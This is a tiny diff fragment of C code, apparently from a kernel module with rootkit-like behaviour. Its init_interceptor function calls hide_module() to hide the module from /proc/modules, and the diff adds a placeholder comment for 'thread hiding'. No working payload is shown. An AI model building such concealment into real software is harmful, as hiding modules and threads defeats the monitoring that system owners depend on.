@@ -26,6 +26,9 @@ int init_interceptor(void) {
     // Hide module in /proc/modules
     hide_module();
 
+    // Add thread hiding
+    // ...
+
     return SUCCESS;
 }
 
